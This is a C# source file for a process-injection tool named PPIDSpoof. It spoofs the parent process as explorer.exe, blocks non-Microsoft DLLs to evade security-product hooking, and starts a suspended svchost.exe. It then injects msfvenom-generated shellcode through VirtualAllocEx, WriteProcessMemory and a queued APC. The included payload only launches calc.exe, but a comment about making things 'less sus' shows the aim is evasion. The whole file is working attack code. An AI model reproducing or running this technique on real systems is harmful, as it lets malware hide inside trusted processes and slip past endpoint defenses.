﻿using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using static PPIDSpoof.Imports.Imports;

namespace PPIDSpoof
{
    class Program
    {
        static void Main(string[] args)
        {
            STARTUPINFOEX siex = new STARTUPINFOEX();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

            var process = Process.GetProcessesByName("explorer");
            int parentProc = 0;
            foreach (var p in process)
            {
                parentProc += p.Id;
            }

            //TODO: Make this work!! Process gets created successfully. Just needs to make it hidden so its less sus.
            /*if (parentProc == 0)
            {
                Console.WriteLine("[-] Specified process does not exist.");
                string proc = @"C:\Windows\System32\explorer.exe";
                bool newProc = CreateProcess(proc, null, IntPtr.Zero, IntPtr.Zero, false, CreationFlags.CREATE_NO_WINDOW, IntPtr.Zero, null, ref siex, ref pi);
                ShowWindow(pi.hProcess, SW_HIDE);
                parentProc += pi.dwProcessId;
            }*/

            Console.WriteLine("[*] New Parent PID Found: {0}", parentProc);

            IntPtr procHandle = OpenProcess(ProcessAccessFlags.CreateProcess | ProcessAccessFlags.DuplicateHandle, false, parentProc);

            IntPtr lpSize = IntPtr.Zero;
            InitializeProcThreadAttributeList(IntPtr.Zero, 2, 0, ref lpSize);

            siex.lpAttributeList = Marshal.AllocHGlobal(lpSize);
            InitializeProcThreadAttributeList(siex.lpAttributeList, 2, 0, ref lpSize);

            IntPtr lpValueProc = Marshal.AllocHGlobal(IntPtr.Size);
            Marshal.WriteIntPtr(lpValueProc, procHandle);
            UpdateProcThreadAttribute(siex.lpAttributeList, 0, (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, lpValueProc, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);

            IntPtr lpMitigationPolicy = Marshal.AllocHGlobal(IntPtr.Size);
            Marshal.WriteInt64(lpMitigationPolicy, PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON);
            UpdateProcThreadAttribute(siex.lpAttributeList, 0, (IntPtr)PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, lpMitigationPolicy, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);

            string app = @"C:\Windows\System32\svchost.exe";
            bool procinit = CreateProcess(app, null, IntPtr.Zero, IntPtr.Zero, true, CreationFlags.SUSPENDED | CreationFlags.EXTENDED_STARTUPINFO_PRESENT, IntPtr.Zero, null, ref siex, ref pi);
            Console.WriteLine("[*] Process Created. Process ID: {0}", pi.dwProcessId);
            Console.ReadKey();

            // msfvenom -p windows/x64/exec CMD=calc.exe -f csharp
            byte[] buf = new byte[276] {
                0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
                0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
                0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
                0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
                0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
                0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
                0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,
                0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,
                0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,
                0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
                0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,
                0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
                0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,
                0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
                0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,
                0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
                0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,
                0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,
                0x63,0x2e,0x65,0x78,0x65,0x00 };

            IntPtr resultPtr = VirtualAllocEx(pi.hProcess, IntPtr.Zero, buf.Length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

            IntPtr bytesWritten = IntPtr.Zero;
            bool resultBool = WriteProcessMemory(pi.hProcess, resultPtr, buf, buf.Length, ref bytesWritten);

            uint oldProtect = 0;
            IntPtr proc_handle = pi.hProcess;
            resultBool = VirtualProtectEx(proc_handle, resultPtr, buf.Length, PAGE_EXECUTE_READ, out oldProtect);

            IntPtr ptr = QueueUserAPC(resultPtr, pi.hThread, IntPtr.Zero);

            IntPtr ThreadHandle = pi.hThread;
            ResumeThread(ThreadHandle);
        }
    }
}
